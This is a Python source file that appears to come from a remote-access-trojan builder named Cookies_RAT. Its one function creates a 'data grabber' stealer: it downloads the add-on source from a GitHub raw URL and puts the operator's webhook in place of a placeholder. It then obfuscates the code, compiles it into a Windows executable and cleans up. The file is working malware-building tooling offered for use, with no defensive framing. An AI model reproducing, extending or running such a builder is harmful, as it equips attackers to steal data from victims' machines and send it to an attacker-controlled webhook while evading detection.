import os, shutil, requests
from cookies_package import *
from util.plugins.common import clear, cleanup, compile, temp
from colorama import Fore


fileName = "Data_Grabber_add_on"

def Create_Data_Grabber(webhook):
    clear()
    try:
        '''
        Write source to file and replace the webhook
        '''
        r = requests.get("https://raw.githubusercontent.com/Callumgm/Cookies_RAT/master/builder/assets/data_grabber_addon.py").text.replace("WEBHOOK_HERE", webhook)
        with open(f"{fileName}.py", "w") as f: f.write(r)
        f.close()

        obfusacate(f"{fileName}.py")    # Obfuscate the file

        compile(fileName)   # Compile the file to executable
        shutil.move(f"{os.getcwd()}\\dist\\{fileName}.exe", f"{os.getcwd()}\\{fileName}.exe")   # Move the executable from dist folder to the current directory
        cleanup(fileName)   # Cleanup the files

    except Exception as e:
        print(f'{Fore.LIGHTRED_EX}Error while making exe{Fore.RESET}: {e}')
        cleanup(fileName)   # Cleanup the files
        input(f'\n\n{Fore.RESET}[{Fore.YELLOW}>>>{Fore.RESET}] {Fore.CYAN}Enter anything to continue {Fore.RESET}. . .')

    print(f"\n{Fore.GREEN}Finshed creating data grabber add on{Fore.RESET}\n")
    input(f'{Fore.RESET}[{Fore.YELLOW}>>>{Fore.RESET}] {Fore.CYAN}Enter anything to continue {Fore.RESET}. . .')